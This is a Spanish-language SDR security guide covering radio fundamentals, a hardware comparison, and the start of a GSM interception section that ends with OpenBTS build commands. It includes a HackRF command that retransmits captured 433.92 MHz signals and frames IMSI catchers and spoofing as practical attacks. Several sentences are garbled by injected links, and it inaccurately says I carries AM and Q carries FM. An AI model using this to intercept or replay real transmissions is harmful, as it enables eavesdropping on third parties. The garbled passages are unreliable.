# SDR y Telecomunicaciones — Guía Ultra-Detallada

> **Versión**: 1.0 | **Idioma**: Español (AR) | **Nivel**: Intermedio-Avanzado

---

## Índice

> ⏱️ **Tiempo estimado:** 30 horas (~6 sesiones) (3449 lineas)


1. [Introducción](#1-introducción)
2. [Fundamentos de SDR](#2-fundamentos-de-sdr)
   - 2.1 [¿Qué es Software Defined Radio?](#21-qué-es-software-defined-radio)
   - 2.2 [IQ Samples](#22-iq-samples)
   - 2.3 [Sampling Theory y Nyquist](#23-sampling-theory-y-nyquist)
   - 2.4 [ADC / DAC](#24-adc--dac)
   - 2.5 [Tuning y Frecuencia](#25-tuning-y-frecuencia)
   - 2.6 [Modulaciones: AM, FM, SSB, PSK, QAM, FSK](#26-modulaciones-am-fm-ssb-psk-qam-fsk)
   - 2.7 [Filtering y DSP Básico](#27-filtering-y-dsp-básico)
   - 2.8 [Antenas y Propagación](#28-antenas-y-propagación)
3. [Hardware Comparativa](#3-hardware-comparativa)
   - 3.1 [RTL-SDR](#31-rtl-sdr)
   - 3.2 [HackRF One](#32-hackrf-one)
   - 3.3 [LimeSDR](#33-limesdr)
   - 3.4 [BladeRF](#34-bladerf)
   - 3.5 [USRP](#35-usrp)
   - 3.6 [PlutoSDR / ADALM-PLUTO](#36-plutosdr--adalm-pluto)
   - 3.7 [AirSpy](#37-airspy)
   - 3.8 [SDRplay](#38-sdrplay)
   - 3.9 [Comparativa: Cuál Elegir](#39-comparativa-cuál-elegir)
4. [GSM Interception](#4-gsm-interception)
   - 4.1 [Arquitectura GSM](#41-arquitectura-gsm)
   - 4.2 [OpenBTS](#42-openbts)
   - 4.3 [YateBTS](#43-yatebts)
   - 4.4 [Osmocom](#44-osmocom)
   - 4.5 [GSM Capture con gr-gsm](#45-gsm-capture-con-gr-gsm)
   - 4.6 [SMS Interception](#46-sms-interception)
   - 4.7 [GSM Sniffing y Decodificación](#47-gsm-sniffing-y-decodificación)
   - 4.8 [IMSI Catcher (Stingray) Theory](#48-imsi-catcher-stingray-theory)
5. [LTE / 4G Analysis](#5-lte--4g-analysis)
   - 5.1 [Arquitectura LTE](#51-arquitectura-lte)
   - 5.2 [srsLTE / srsRAN](#52-srslte--srsran)
   - 5.3 [LTE Cell Scanner](#53-lte-cell-scanner)
   - 5.4 [IMSI Catcher Theory en LTE](#54-imsi-catcher-theory-en-lte)
   - 5.5 [S1AP / NAS Protocol Analysis](#55-s1ap--nas-protocol-analysis)
   - 5.6 [LTE Sniffing](#56-lte-sniffing)
6. [5G Security](#6-5g-security)
   - 6.1 [5G NSA vs SA](#61-5g-nsa-vs-sa)
   - 6.2 [SUPI Encryption](#62-supi-encryption)
   - 6.3 [IMSI Catching en 5G](#63-imsi-catching-en-5g)
   - 6.4 [5G Protocol Vulnerabilities](#64-5g-protocol-vulnerabilities)
   - 6.5 [Network Slicing Attacks](#65-network-slicing-attacks)
7. [GPS Spoofing](#7-gps-spoofing)
   - 7.1 [Fundamentos de GPS](#71-fundamentos-de-gps)
   - 7.2 [GPS Signal Simulation con HackRF](#72-gps-signal-simulation-con-hackrf)
   - 7.3 [gps-sdr-sim](#73-gps-sdr-sim)
   - 7.4 [Afectando Sistemas de Navegación en Drones](#74-afectando-sistemas-de-navegación-en-drones)
   - 7.5 [GPS Jamming](#75-gps-jamming)
8. [Satellite Interception](#8-satellite-interception)
   - 8.1 [Weather Satellite Decoding (NOAA)](#81-weather-satellite-decoding-noaa)
   - 8.2 [Meteor-M2 LRPT](#82-meteor-m2-lrpt)
   - 8.3 [GOES Reception](#83-goes-reception)
   - 8.4 [Satellite Phone Interception](#84-satellite-phone-interception)
   - 8.5 [Inmarsat / Iridium](#85-inmarsat--iridium)
   - 8.6 [CubeSat y Amateur Satellites](#86-cubesat-y-amateur-satellites)
9. [Herramientas](#9-herramientas)
   - 9.1 [GNU Radio](#91-gnu-radio)
   - 9.2 [GQRX](#92-gqrx)
   - 9.3 [Inspectrum](#93-inspectrum)
   - 9.4 [Universal Radio Hacker (URH)](#94-universal-radio-hacker-urh)
   - 9.5 [rtl_433](#95-rtl_433)
   - 9.6 [dump1090](#96-dump1090)
   - 9.7 [Multimon-NG](#97-multimon-ng)
   - 9.8 [WSJT-X / FT8](#98-wsjt-x--ft8)
10. [Escenarios Prácticos](#10-escenarios-prácticos)
    - 10.1 [Escenario 1: Captura y Decodificación de Pager (POCSAG)](#101-escenario-1-captura-y-decodificación-de-pager-pocsag)
    - 10.2 [Escenario 2: ADS-B Aircraft Tracking](#102-escenario-2-ads-b-aircraft-tracking)
    - 10.3 [Escenario 3: NOAA Weather Satellite](#103-escenario-3-noaa-weather-satellite)
    - 10.4 [Escenario 4: GSM Capture en Lab](#104-escenario-4-gsm-capture-en-lab)
    - 10.5 [Escenario 5: GPS Spoofing Simulator](#105-escenario-5-gps-spoofing-simulator)
11. [Ejercicios Prácticos](#11-ejercicios-prácticos)
12. [Referencias y Recursos](#12-referencias-y-recursos)

---

## 1. Introducción

[software defined radio](../raw/sdr-t3l3c0ms.md)-t3l3c0ms.md) ([sdr](../raw/sdr-t3l3c0ms.md)) transformó la radio tal como la conocemos. Lo que antes requería hardware específico para cada modulación o frecuencia ahora se hace con software. Con un dongle de $25 ($RTL-[sdr](../raw/sdr-t3l3c0ms.md)), podés escuchar desde satélites meteorológicos hasta tráfico aéreo, pasando por GSM, LTE, y hasta [gps spoofing](../raw/sp4c3-s3c.md#gps-spoofing).

Esta guía cubre TODO el espectro del SDR aplicado a seguridad: desde los fundamentos teóricos (IQ samples, Nyquist, ADC/DAC) hasta ataques prácticos (IMSI catchers, GPS spoofing, intercepción satelital).

> **Advertencia legal**: Interceptar comunicaciones ajenas y transmitir en frecuencias reguladas sin licencia es ilegal en la mayoría de los países. Todo el contenido es educativo. Usá frecuencias ISM (2.4 GHz, 915 MHz) o bandas de radioaficionado para practicar.

---

## 2. Fundamentos de [sdr](../raw/sdr-t3l3c0ms.md)

### 2.1 ¿Qué es [software defined radio](../raw/sdr-t3l3c0ms.md)?

Una radio definida por software reemplaza componentes de hardware (mezcladores, filtros, demoduladores) con procesamiento digital en software.

**Radio tradicional vs SDR**:

```
Radio Tradicional:
Antena → Filtro RF → Mezclador → Filtro IF → Demodulador → Audio

SDR:
Antena → Filtro RF → ADC → FPGA/DSP → Software → Audio
                    ↓
             IQ Samples (datos digitales)
```

**En SDR, la magia pasa después del ADC**: todo el procesamiento de señal (filtrado, demodulación, decodificación) se hace en software.

**Arquitectura típica de un sistema SDR**:

```
┌─────────┐  ┌────────────┐  ┌──────────┐  ┌──────────────┐  ┌──────────┐
│ Antenna │→ │ Front-End  │→ │   ADC    │→ │   FPGA/DSP   │→ │   USB    │
│         │  │ (LNA, Mix) │  │          │  │  (DDC/DUC)   │  │ (IQ data)│
└─────────┘  └────────────┘  └──────────┘  └──────────────┘  └──────────┘
                                                                    ↓
                                                          ┌──────────────────┐
                                                          │      PC/Host     │
                                                          │ - GNU Radio/GQRX │
                                                          │ - Demodulación   │
                                                          │ - Decodificación │
                                                          │ - Visualización  │
                                                          └──────────────────┘
```

### 2.2 IQ Samples

IQ (In-phase / Quadrature) es la representación digital de una señal de RF. Son dos componentes que representan una onda senoidal.

**Matemáticamente**:

```
S(t) = I(t) * cos(2πft) - Q(t) * sin(2πft)

Donde:
- I: componente en fase (coseno)
- Q: componente en cuadratura (seno, 90° desfasado)
- f: frecuencia de la portadora
```

**Por qué IQ?**:

La señal IQ permite representar AM y FM simultáneamente:
- **I** representa la modulación de amplitud (AM)
- **Q** representa la modulación de fase (FM, PM)

**Visualización IQ**:

Cada sample IQ es un punto en el plano complejo:
```
Q (eje imaginario)
    ↑
    │   ● (1, 1) → señal con fase 45°
    │
────┼───────→ I (eje real)
    │   ● (1, -1) → señal con fase -45°
    │
```

**Formas de visualizar IQ**:

1. **Constelación**: I vs Q (cada punto es un símbolo)
2. **Waterfall / Espectrograma**: frecuencia vs tiempo vs amplitud
3. **Frecuencia vs amplitud**: FFT del espectro

**Tasa de muestreo vs ancho de banda**:

```
Sample rate → ancho de banda capturable
2 Msps → 2 MHz de ancho de banda (de -1 MHz a +1 MHz alrededor de la frecuencia central)
```

### 2.3 Sampling Theory y Nyquist

El **Teorema de Nyquist-Shannon** es fundamental: para digitalizar una señal sin pérdida, la frecuencia de muestreo (fs) debe ser al menos el doble de la frecuencia máxima de la señal (fmax).

```
fs ≥ 2 * fmax
```

**Ejemplos**:

```
Señal de audio (20 kHz): fs ≥ 40 kHz (CD: 44.1 kHz)
FM broadcast (15 kHz de ancho de banda): fs ≥ 30 kHz
GSM (200 kHz de ancho de banda): fs ≥ 400 kHz
WiFi (20 MHz de ancho de banda): fs ≥ 40 MHz
```

**Aliasing**: Si muestreás por debajo de Nyquist, frecuencias altas se "doblan" y aparecen como frecuencias bajas falsas:

```
fs = 100 Hz, señal = 80 Hz → aparece como 20 Hz (alias)
fs = 100 Hz, señal = 120 Hz → aparece como 20 Hz (alias)
```

**Subsampling (bandpass sampling)**: Podés samplear a frecuencias mucho más bajas que la frecuencia portadora si la señal ocupa un ancho de banda limitado:

```
Querés capturar una señal GSM a 900 MHz con 200 kHz de ancho de banda.
No necesitás fs = 2 * 900 MHz = 1.8 GHz
Necesitás fs = 2 * 200 kHz = 400 kHz (con el front-end adecuado)
```

**En la práctica**:

- RTL-SDR: sample rate máximo ~3.2 Msps (ancho de banda ~3.2 MHz)
- [hackrf](../raw/sdr-t3l3c0ms.md#hackrf): sample rate máximo 20 Msps (ancho de banda ~20 MHz)
- USRP: sample rate hasta 200+ Msps

### 2.4 ADC / DAC

**ADC (Analog to Digital Converter)**:
- Convierte voltaje analógico en valores digitales
- Resolución: bits (8, 12, 14, 16 bits)
- Sample rate: samples por segundo
- ENOB (Effective Number of Bits): bits efectivos (menos que los bits nominales por ruido)

**DAC (Digital to Analog Converter)**:
- Convierte valores digitales en voltaje analógico
- Mismas especificaciones que ADC

**Resolución y rango dinámico**:

```
8 bits: 256 niveles → ~48 dB de rango dinámico
12 bits: 4096 niveles → ~72 dB de rango dinámico
14 bits: 16384 niveles → ~84 dB de rango dinámico
16 bits: 65536 niveles → ~96 dB de rango dinámico
```

**Parámetros clave de ADC**:

| Parámetro | Descripción | Importancia |
|---|---|---|
| Sample Rate | Samples/segundo | Determina BW capturable |
| Resolution | Bits | Determina rango dinámico |
| SFDR | Spurious-Free Dynamic Range | Pureza espectral |
| ENOB | Effective bits | Bits reales útiles |
| SNR | Signal-to-Noise Ratio | Calidad de señal |

**ADC en SDRs comunes**:

```
RTL-SDR: 8 bits (nominal), ~6.5 ENOB, 3.2 Msps
HackRF: 8 bits, 20 Msps
LimeSDR: 12 bits, 61.44 Msps (RX)
BladeRF: 12 bits, 61.44 Msps
USRP B210: 12 bits, 61.44 Msps
PlutoSDR: 12 bits, 61.44 Msps
```

### 2.5 Tuning y Frecuencia

El **sintonizado (tuning)** es el [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) de seleccionar qué frecuencia querés recibir/transmitir.

**Arquitectura de tuning en un SDR**:

```
Frecuencia de RF → Mezclador → Frecuencia Intermedia (IF) → ADC
                        ↑
               Oscilador Local (LO)
               Frecuencia = frecuencia deseada - IF
```

**Zero-IF vs Low-IF**:

```
Zero-IF: convierte directamente a banda base (LO = frecuencia deseada)
  - Simple, barato
  - Problemas: DC offset, flicker noise, IQ imbalance

Low-IF: convierte a una frecuencia intermedia baja
  - Mejor rendimiento
  - Más complejo
```

**Frecuencia central y span**:

```
Frecuencia central = 100 MHz
Sample rate = 2 Msps
→ Capturás de 99 MHz a 101 MHz (2 MHz de ancho)

Frecuencia central = 433.92 MHz (ISM banda)
Sample rate = 1 Msps
→ Capturás de 433.42 MHz a 434.42 MHz
```

**Tuning en RTL-SDR**:

```bash
# Con rtl_tcp (streaming de IQ samples)
rtl_tcp -a 0.0.0.0 -f 100000000 -s 2048000

# Con rtl_fm (FM demodulado a audio)
rtl_fm -f 100.5e6 -M fm -s 200k -r 48k | aplay

# Con rtl_power (espectro)
rtl_power -f 88M:108M:100k -i 1 -e 1h power.csv
```

### 2.6 Modulaciones: AM, FM, SSB, PSK, QAM, FSK

Cada modulación codifica información en una portadora de forma distinta.

**AM (Amplitude Modulation)**:

```
Señal: S(t) = (1 + m(t)) * cos(2πf_ct)

Donde m(t) es la señal moduladora (audio)
f_c es la frecuencia portadora

Ancho de banda: 2 * frecuencia máxima de m(t)
Ej: AM broadcast: 10 kHz por canal
```

**FM (Frequency Modulation)**:

```
Señal: S(t) = cos(2πf_ct + 2πk_f ∫m(t)dt)

La frecuencia instantánea varía con m(t)

Ancho de banda: 2 * (desviación + frecuencia máxima)
Ej: FM broadcast: ~200 kHz por canal (desviación 75 kHz)
Narrowband FM (NBFM): ~12.5 kHz (desviación 2.5-5 kHz)
```

**SSB (Single Side Band)**:

```
Es AM pero solo transmitís una banda lateral (USB o LSB)
+ Mitad de ancho de banda
+ Más eficiente en potencia
- Requiere oscilador preciso (beat frequency oscillator)

Usos: radioaficionados, comunicaciones de larga distancia
```

**PSK (Phase Shift Keying)**:

```python
# BPSK: 1 bit por símbolo (fase 0° o 180°)
# QPSK: 2 bits por símbolo (4 fases: 0°, 90°, 180°, 270°)
# 8PSK: 3 bits por símbolo (8 fases)

# Diagrama de constelación QPSK:
#     Q
# 01●│●00
# ───┼─── I
# 10●│●11
```

**QAM (Quadrature Amplitude Modulation)**:

```python
# Combina PSK + ASK (cambia fase y amplitud)
# 16-QAM: 4 bits por símbolo
# 64-QAM: 6 bits por símbolo
# 256-QAM: 8 bits por símbolo

# Diagrama de constelación 16-QAM:
#   Q
#   ● ● ● ●    (cada posición tiene fase y amplitud únicas)
#   ● ● ● ●
#   ● ● ● ●
#   ● ● ● ● → I
```

**FSK (Frequency Shift Keying)**:

```python
# Cambia frecuencia para representar bits
# 2-FSK: frecuencia f1 para 0, f2 para 1
# 4-FSK: 4 frecuencias, 2 bits por símbolo

# Ej: APRS (1200 baud AFSK), POCSAG (pagers)
# Mensajería: 0 → 1200 Hz, 1 → 2200 Hz
```

**Modulaciones digitales comunes**:

| Modulación | Eficiencia | Robustez | Usos |
|---|---|---|---|
| BPSK | 1 b/s/Hz | Alta | Satélites, GPS |
| QPSK | 2 b/s/Hz | Alta | LTE, DVB-S |
| 16-QAM | 4 b/s/Hz | Media | LTE, [wifi](../raw/w1f1-4tt4cks.md) |
| 64-QAM | 6 b/s/Hz | Baja | LTE, DVB-T |
| GMSK | 1 b/s/Hz | Alta | GSM |
| GFSK | [variable](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#variables) | Alta | Bluetooth, LoRa |

### 2.7 Filtering y DSP Básico

El procesamiento digital de señales (DSP) filtra y transforma las IQ samples.

**Filtros comunes**:

```
Low-Pass Filter (LPF): pasa frecuencias bajas, bloquea altas
High-Pass Filter (HPF): pasa altas, bloquea bajas
Band-Pass Filter (BPF): pasa un rango de frecuencias
Band-Stop Filter (BSF): bloquea un rango
```

**Tipos de filtros**:

```
FIR (Finite Impulse Response):
  - Estable, fase lineal
  - Más caro computacionalmente
  - Ej: filtro pasa-bajos de 100 taps

IIR (Infinite Impulse Response):
  - Menos taps, más eficiente
  - Puede ser inestable
  - Ej: Butterworth, Chebyshev, Elliptic
```

**Operaciones DSP básicas**:

```python
# En GNU Radio o Python con numpy/scipy

# 1. Downconversion (mover a banda base)
# Multiplicar por cos + sin a frecuencia LO

# 2. Decimation (reducir sample rate)
# Ej: 2 Msps → 200 ksps (factor 10)
# Siempre filtrar antes de decimar para evitar aliasing

# 3. FFT (Fast Fourier Transform)
# Convierte tiempo a frecuencia
# Útil para visualizar espectro

# 4. Convolución
# Aplica filtro FIR a la señal

# 5. Detección de envolvente
# Extrae la amplitud (para AM)
# envolvente = sqrt(I² + Q²)
```

**Ejemplo de FFT en [python](../raw/pyth0n-f0r-h4ck1ng.md)**:

```python
import numpy as np
import matplotlib.pyplot as plt

# Cargar IQ samples (archivo binario)
samples = np.fromfile('capture.iq', dtype=np.complex64)

# FFT
N = 1024
fft_data = np.fft.fftshift(np.fft.fft(samples[:N]))

# Ejes de frecuencia
fs = 2e6  # 2 MHz sample rate
freq = np.linspace(-fs/2, fs/2, N)

# Plot
plt.plot(freq/1e6, 20*np.log10(np.abs(fft_data)))
plt.xlabel('Frecuencia (MHz)')
plt.ylabel('Amplitud (dB)')
plt.show()
```

### 2.8 Antenas y Propagación

La antena es el componente más subestimado en SDR.

**Tipos de antenas**:

| Tipo | Ganancia | Patrón | Uso |
|---|---|---|---|
| Dipolo (~λ/2) | 2.15 dBi | Omnidireccional | General |
| Monopolo (~λ/4) | ~2 dBi | Omnidireccional con ground | Portable |
| Yagi | 10-20 dBi | Direccional | Satélites, direcciones fijas |
| Log-Periodic | 6-10 dBi | Direccional (broadband) | Barrido de frecuencias |
| Parabólica (disco) | 20-40 dBi | Muy direccional | Satélites, GOES |
| Helical | 10-15 dBi | Direccional, circular | Satélites (polarización) |
| Patch | 3-7 dBi | Hemisférica | GPS, WiFi |
| Discone | ~2 dBi | Omnidireccional (broadband) | Recepción general |

**Cálculo de longitud de antena**:

```
Longitud de onda: λ = 300 / f(MHz)

Dipolo de media onda: L = λ/2 = 150 / f(MHz)
Monopolo de cuarto de onda: L = λ/4 = 75 / f(MHz)

Ejemplos:
100 MHz (FM): λ = 3m, dipolo = 1.5m
433 MHz (ISM): λ = 69cm, dipolo = 34.5cm
1.5 GHz (GPS): λ = 20cm, dipolo = 10cm
2.4 GHz (WiFi): λ = 12.5cm, dipolo = 6.25cm
```

**Propagación de radio**:

```
VHF (30-300 MHz):
  - Línea de vista + algo de difracción
  - Alcance típico: 10-100 km (dependiendo de potencia y altura)

UHF (300-3000 MHz):
  - Principalmente línea de vista
  - Penetra edificios (menos que VHF)
  - Alcance: 1-20 km

SHF (> 3 GHz):
  - Línea de vista estricta
  - Requiere antenas direccionales
  - Absorción por lluvia
```

**Señales que se reflejan en la ionosfera**:

```
HF (3-30 MHz): reflejada por ionosfera → comunicaciones globales
VHF/UHF: normalmente no se reflejan (salvo propagación esporádica E)
```

---

## 3. Hardware Comparativa

### 3.1 RTL-[sdr](../raw/sdr-t3l3c0ms.md)

El RTL-SDR es el SDR más barato y popular (~$25-35). Originalmente diseñado como sintonizador de TV digital (DVB-T), se descubrió que se podía usar como SDR de propósito general.

**Especificaciones técnicas**:

```
Frecuencia: 24 MHz - 1.7 GHz (con mods: 22 MHz - 2.2 GHz)
Sample rate: hasta 3.2 Msps (estable: 2.4 Msps)
Resolución ADC: 8 bits (EF Épsilon efectivos ~6-7 bits)
Interfaz: USB 2.0
Chipset: RTL2832U + R820T2 (el más común)
Impedancia: 75Ω (50Ω con adaptador)
```

**Modelos populares**:

```
RTL-SDR Blog V3 ($30): TCXO, SMA, 0.5 ppm stability
Nooelec NESDR Smart ($28): similar al Blog V3
Nooelec NESDR SMArt ($20): version económica
```

**Ventajas**:
- Muy barato
- Gran comunidad
- Funciona con todo el software (GQRX, SDR#, GNU Radio)
- Pequeño y portátil

**Limitaciones**:
- Solo recepción (no transmitir sin modificación)
- Sample rate limitado (3.2 Msps max)
- 8 bits de resolución (rango dinámico limitado)
- Frecuencia máxima ~1.7 GHz (sin mods)

```bash
# Probar RTL-SDR
rtl_test -t

# Ver dispositivos
rtl_eeprom -d 0

# Capturar IQ
rtl_sdr -f 433920000 -s 2048000 -n 10e6 capture.iq
```

### 3.2 [hackrf](../raw/sdr-t3l3c0ms.md#hackrf) One

HackRF One es el SDR más usado para seguridad y pentesting. Creado por Michael Ossmann de Great Scott Gadgets.

**Especificaciones**:

```
Frecuencia: 1 MHz - 6 GHz
Sample rate: 20 Msps (8 bits)
Resolución ADC/DAC: 8 bits
Interfaz: USB 2.0 (High Speed)
Half-duplex (TX o RX, no simultáneo)
Potencia TX: ~10-15 dBm (10-30 mW)
Conector: SMA (antena incluida)
Precio: ~$300
```

**Capacidades**:

- TX y RX (half-duplex)
- 1 MHz a 6 GHz (cubre casi todo)
- 20 MHz de ancho de banda
- Ideal para: [gps spoofing](../raw/sp4c3-s3c.md#gps-spoofing), GSM BTS, señal hijacking, RF testing

**Limitaciones**:

- Half-duplex (no RX y TX al mismo tiempo)
- 8 bits (rango dinámico limitado)
- Ruido de fase relativamente alto
- Potencia TX baja (requiere amplificador externo)

```bash
# hackrf_transfer (capturar y transmitir)
# Capturar
hackrf_transfer -r capture.iq -f 433920000 -s 2000000 -n 10000000

# Transmitir
hackrf_transfer -t capture.iq -f 433920000 -s 2000000 -x 20

# Ver espectro en tiempo real
hackrf_sweep -f 100000000:200000000

# Información del dispositivo
hackrf_info
```

### 3.3 LimeSDR

LimeSDR es un SDR open-source con mejor rendimiento que HackRF.

**Especificaciones**:

```
Frecuencia: 100 kHz - 3.8 GHz (LimeSDR USB)
              100 kHz - 3.8 GHz (LimeSDR Mini)
Sample rate: 61.44 Msps max (RX y TX)
Resolución ADC/DAC: 12 bits
Interfaz: USB 3.0
Full-duplex (RX y TX simultáneo)
Potencia TX: ~0-5 dBm (LimeSDR) / ~-10 a 10 dBm (Mini)
Conector: SMA/U.FL
Precio: ~$300-400
```

**Cuándo elegir LimeSDR**:

- Necesitás full-duplex (ej: repetidor GSM)
- Necesitás mejor rango dinámico (12 bits vs 8 bits)
- Trabajás con LTE (61.44 Msps permite capturar canales LTE)
- Presupuesto medio

**Limitaciones**:

- Documentación menos pulida
- Drivers a veces problemáticos (LMS7 suite)
- Menos comunidad que HackRF

```bash
# LimeSDR con LimeSuite
LimeUtil --find

# Transmitir tono
limeTX -f 2400000000 -s 2000000 -b 10 -g 0.5

# Capturar IQ
limeRX -f 433000000 -s 5000000 -b 100 -g 0.5 -r capture.iq
```

### 3.4 BladeRF

BladeRF de Nuand es otro SDR de rango medio.

**Especificaciones**:

```
Frecuencia: 300 kHz - 3.8 GHz (x115, x40)
              47 MHz - 6 GHz (2.0 micro)
Sample rate: 61.44 Msps (x115, x40)
              61.44 Msps (2.0 micro)
Resolución ADC/DAC: 12 bits (RX), 12 bits (TX, x115) / 16 bits (TX, 2.0)
Interfaz: USB 3.0
Full-duplex
FPGA: Cyclone IV (x115) / Cycline V (2.0 micro)
Potencia TX: ~6 dBm
Precio: ~$400-700
```

**Ventajas**:
- FPGA programable (VHDL/Verilog)
- Full-duplex
- Buena documentación
- 2.0 micro tiene frecuencia hasta 6 GHz

**Desventajas**:
- Más caro
- Consume más potencia
- FPGA programming requiere conocimientos de HDL

```bash
# bladeRF-cli
bladeRF-cli -p
bladeRF-cli -i

# Dentro de la CLI
> set frequency 2.4G
> set samplerate 40M
> rx config file=capture.bin n=1000000
> rx start
> rx wait
```

### 3.5 USRP

USRP (Universal Software Radio Peripheral) de Ettus Research (ahora NI) es el estándar industrial.

**Modelos**:

```
USRP B200/B210: $700-1100, 70 MHz-6 GHz, 61.44 Msps, 12 bits
USRP N300/N310: $3000-5000, red, GPSDO, 10 MHz ref
USRP X300/X310: $5000-10000, 200 Msps, PCIe/10GbE
USRP E310: $3000+, standalone (ARM + FPGA)
```

**Cuándo USRP**:

- Investigación académica
- Implementación de [redes](../raw/r3d3s-f0nd4m3nt0s.md) celulares completas (OpenBTS)
- Análisis espectral avanzado
- Aplicaciones que requieren GPSDO (precisión de tiempo)

**Ventajas**:
- Calidad profesional
- Amplio soporte de software (UHD library)
- Múltiples canales (B210: 2 TX + 2 RX)

**Desventajas**:
- Costoso
- Más grande y pesado
- Overkill para la mayoría de aplicaciones

```bash
# UHD (USRP Hardware Driver)
uhd_find_devices
uhd_usrp_probe

# Capturar con rx_samples_to_file
rx_samples_to_file --args "addr=192.168.10.2" --freq 2.4e9 --rate 40e6 --file capture.bin

# Con GNU Radio (USRP Source block)
```

### 3.6 PlutoSDR / ADALM-PLUTO

El PlutoSDR de Analog Devices es un SDR educativo y económico.

**Especificaciones**:

```
Frecuencia: 325 MHz - 3.8 GHz (puede extenderse a 70 MHz - 6 GHz)
Sample rate: 61.44 Msps (limitado a 20 Msps por USB)
Resolución ADC/DAC: 12 bits
Interfaz: USB 2.0 (o Ethernet por módulo)
Full-duplex
Potencia TX: ~7 dBm
Precio: ~$200
```

**Ventajas**:
- Barato para full-duplex
- Bueno para LTE (con sample rate suficiente)
- Libiio (libIIO) integration
- Pequeño, corre Linux adentro

**Desventajas**:
- Frecuencia inicial limitada (325 MHz stock)
- Documentación técnica densa
- Control de ganancia limitado

```bash
# PlutoSDR con iio-oscilloscope
iio_info -s

# Con GNU Radio (PlutoSDR Source block)
# Frecuencia extendida:
# echo 0 > /sys/bus/usb/devices/.../power/autosuspend
# iio_attr -d ad9361-phy -a "out_altvoltage0_RX_LO_frequency" 100000000
```

### 3.7 AirSpy

AirSpy es un SDR diseñado específicamente para recepción de alto rendimiento.

**Modelos**:

```
AirSpy R2: $170, 24-1700 MHz, 10 Msps, 12 bits
AirSpy Mini: $100, 24-1700 MHz, 6 Msps, 12 bits
AirSpy HF+: $200, 0-31 MHz (HF) + 24-1700 MHz, 12 bits
```

**Ventajas**:
- Excelente rango dinámico (12 bits)
- Muy bajo ruido de fase
- Filtro de preselection (anti-alias)
- Mayor sample rate que RTL-SDR

**Desventajas**:
- Solo recepción (no TX)
- Menos flexible que otros SDRs
- Ecosistema propietario (AirSpy software)

### 3.8 SDRplay

SDRplay es otro receptor de alto rendimiento.

**Modelos**:

```
RSP1A: $110, 1 kHz - 2 GHz, 10 Msps, 14 bits (16 bits en HF)
RSP2: $170, 1 kHz - 2 GHz, 10 Msps, 2 antenas
RSPduo: $280, 1 kHz - 2 GHz, 10 Msps, dual tuner
```

**Ventajas**:
- Excelente rango dinámico (14 bits!)
- Cobertura de HF
- Buena construcción y filtros

**Desventajas**:
- Solo recepción
- Drivers propietarios (SDRuno)
- API menos común

### 3.9 Comparativa: Cuál Elegir

| SDR | Precio | RX Freq | TX Freq | BW | Bits | Duplex | Uso |
|---|---|---|---|---|---|---|---|
| RTL-SDR | $25 | 24M-1.7G | No | 3.2M | 8 | Solo RX | Entry-level, ADS-B, NOAA |
| HackRF | $300 | 1M-6G | 1M-6G | 20M | 8 | Half | Pentesting, GPS spoof, GSM |
| AirSpy R2 | $170 | 24M-1.7G | No | 10M | 12 | Solo RX | Recepción de alta calidad |
| PlutoSDR | $200 | 325M-3.8G | Idem | 20M | 12 | Full | LTE, educación |
| LimeSDR | $300 | 100k-3.8G | Idem | 61M | 12 | Full | LTE, GSM BTS, full-duplex |
| BladeRF | $400+ | 300k-3.8G | Idem | 61M | 12 | Full | FPGA programmable |
| USRP B210 | $1100 | 70M-6G | Idem | 61M | 12 | Full | Investigación, OpenBTS |
| SDRplay | $110 | 1k-2G | No | 10M | 14 | Solo RX | Recepción HF/VHF/UHF |

**Recomendaciones por caso de uso**:

```
Principiante (solo RX): RTL-SDR ($25)
RX avanzado: AirSpy R2 ($170)
Pentesting / GSM básico: HackRF ($300)
LTE / full-duplex económico: PlutoSDR ($200)
LTE / full-duplex completo: LimeSDR ($300)
Profesional / Investigación: USRP B210 ($1100)
FPGA hacking: BladeRF ($400+)
```

---

## 4. GSM Interception

### 4.1 Arquitectura GSM

GSM (Global System for Mobile Communications) es el estándar 2G. Sigue siendo relevante porque es omnipresente y tiene vulnerabilidades conocidas.

**Componentes de una [red](../raw/r3d3s-f0nd4m3nt0s.md) GSM**:

```
┌─────────┐    ┌─────────┐    ┌─────────┐
│   MS    │◄──►│   BTS   │◄──►│   BSC   │◄──►┐
│ (Mobile)│    │(Antenna)│    │(Control)│    │
└─────────┘    └─────────┘    └─────────┘    │
                                              │
                                        ┌─────▼────┐
                                        │   MSC    │
                                        │(Switching)│
                                        └─────┬────┘
                                              │
                                   ┌──────────┼──────────┐
                                   │          │          │
                              ┌────▼───┐ ┌───▼────┐ ┌───▼────┐
                              │  HLR   │ │  VLR   │ │  AuC   │
                              │(Home)  │ │(Visitor)│ │(Auth)  │
                              └────────┘ └────────┘ └────────┘
```

**Bandas de frecuencia GSM**:

| Banda | Uplink (MS→BTS) | Downlink (BTS→MS) | Canales |
|---|---|---|---|
| GSM-900 | 890-915 MHz | 935-960 MHz | 124 |
| DCS-1800 | 1710-1785 MHz | 1805-1880 MHz | 374 |
| PCS-1900 | 1850-1910 MHz | 1930-1990 MHz | 299 |
| GSM-850 | 824-849 MHz | 869-894 MHz | 124 |

**Canales GSM**:

```
GSM usa FDMA + TDMA:
- FDMA: 200 kHz por canal
- TDMA: 8 timeslots por canal (cada ~577 μs)

GMSK modulation (Gaussian Minimum Shift Keying)
Symbol rate: 270.833 kbaud
Bit rate: 270.833 kbps
```

**Identificadores GSM**:

```
IMSI: International Mobile Subscriber Identity (15 dígitos)
IMEI: International Mobile Equipment Identity (15 dígitos)
TMSI: Temporary Mobile Subscriber Identity (asignado por red)
MSISDN: Número de teléfono (lo que marcás)
```

### 4.2 OpenBTS

OpenBTS es una implementación opensource de una BTS (Base Transceiver Station) GSM.

**Arquitectura OpenBTS**:

```
OpenBTS (BTS + BSC + MSC) → SDR → Antena → Teléfonos
        ↓
    SIP Switch (Asterisk/FreeSWITCH)
        ↓
    PSTN (o VoIP)
```

**Requisitos**:

```
Hardware: USRP B210, LimeSDR, o BladeRF (HackRF no es ideal porque es half-duplex)
Software: Ubuntu 20.04+, OpenBTS, Asterisk
```

**Instalación simplificada**:

```bash
# Dependencias
apt-get install -y build-essential libusb-1.0-0-dev libboost-all-dev \
  libsqlite3-dev libreadline-dev libzmq3-dev python3-pip

# Instalar UHD (para USRP)
git clone https://github.com/EttusResearch/uhd.git
cd uhd/host
mkdir build && cd build
cmake ..
make -j4
make install

# Instalar OpenBTS
git clone https://github.com/RangeNetworks/openbts.git
cd openbts
./configure
make -j4
make install

# Configurar
# /etc/OpenBTS/OpenBTS.db
